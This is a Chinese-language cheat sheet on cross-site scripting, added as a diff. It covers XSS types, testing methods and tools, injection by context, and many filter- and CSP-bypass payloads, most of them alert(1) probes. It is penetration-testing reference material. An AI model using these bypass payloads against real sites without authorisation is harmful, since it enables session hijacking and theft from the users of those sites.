@@ -1,0 +1,59 @@
+ XSS（跨站脚本攻击）
+
+1. 漏洞概述
+    定义：攻击者将恶意脚本注入到可信网站，当用户访问时，脚本在受害者浏览器中执行，可窃取 Cookie、劫持会话、篡改页面、钓鱼等。
+    类型：
+        反射型 XSS：恶意脚本作为请求参数，服务端未过滤直接返回，受害者点击恶意链接即触发。
+        存储型 XSS：脚本被持久化存储在数据库/文件中，每次访问相关页面都会执行（危害最大）。
+        DOM 型 XSS：前端 JavaScript 动态修改 DOM 时，将未过滤的用户输入插入到页面中，无需后端参与。
+
+2. 常见攻击向量
+    HTML 标签注入：<script>alert('XSS')</script>
+    事件处理器：<img src=x onerror=alert(1)>、<svg onload=alert(1)>、<body onload=alert(1)>
+    伪协议：<a href="javascript:alert(1)">click</a>
+    iframe：<iframe src="javascript:alert(1)">
+    编码绕过：<img src=x onerror=alert&#40;1&#41;>（HTML 实体编码）
+    属性注入：<input value=""><script>alert(1)</script>">
+    JavaScript 上下文：';alert(1);//（闭合字符串或引号）
+
+3. 通用测试方法
+3.1 手工测试步骤
+    定位注入点：URL 参数、POST 数据、Cookie、Referer、User-Agent、文件上传名、JSON 字段等。
+    确认上下文：观察输入回显位置（HTML 标签内、属性内、JavaScript 代码中、CSS 内等）。
+    构造闭合：根据上下文闭合原有结构（如闭合引号、标签、注释）。
+    选择 payload：从简单 <script>alert(1)</script> 开始，若被过滤则逐步变形。
+
+3.2 自动化辅助
+    Burp Suite：Intruder 批量测试常见 payload，Scanner 自动检测。
+    XSStrike：参数化检测绕过规则。
+    Dalfox：快速扫描 GET/POST 参数。
+    浏览器开发者工具：调试、查看 DOM 变化、检查 CSP 头。
+
+4. 不同上下文中的注入技巧
+上下文	注入方式	示例
+HTML 标签内容	直接插入标签或事件	<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+HTML 标签属性值	闭合属性，添加新事件	"><img src=x onerror=alert(1)>
+JavaScript 字符串	闭合字符串并注入代码	';alert(1);//
+JavaScript 代码块	利用 eval、Function 或 new	';new Function('alert(1)')();//
+CSS 内	使用 expression（IE）或 url() 注入	background:url(javascript:alert(1));
+URL 参数	利用 javascript: 伪协议	javascript:alert(1)
+
+5. 常见过滤器与绕过技术
+5.1 黑名单过滤
+    过滤 <script>：改用其他标签（<img>、<svg>、<iframe>、<body>）或事件。
+    过滤 on 事件：大小写混合（OnError）、空格换行（onerror=alert(1)）、斜杠（onerror=alert(1)）。
+    过滤 alert：使用 confirm、prompt、eval、Function、setTimeout、window['alert']。
+    过滤 ( )：使用反引号 `、模板字符串、编码。
+    过滤 < >：利用属性自动闭合（" onmouseover=alert(1)），或使用 HTML 实体编码。
+
+5.2 高级绕过
+    HTML 实体编码：<img src=x onerror=alert&#40;1&#41;>
+    Unicode 编码：<img src=x onerror=alert\u0028\u0031\u0029>
+    双写绕过：<scr<script>ipt>alert(1)</scr</script>ipt>
+    注释绕过：<script>/*<![CDATA[*/alert(1)/*]]>*/</script>
+    SVG 与 MathML：<svg><script>alert(1)</script></svg>、<math><a xlink:href="javascript:alert(1)">
+    JavaScript 模板字符串：`${alert(1)}`
+    利用 \ 转义：在字符串中闭合引号 \' + alert(1) + \'
+    CSP 绕过：利用允许的源（如 cdn）或 JSONP 端点，或 unsafe-eval 配合 eval。
+
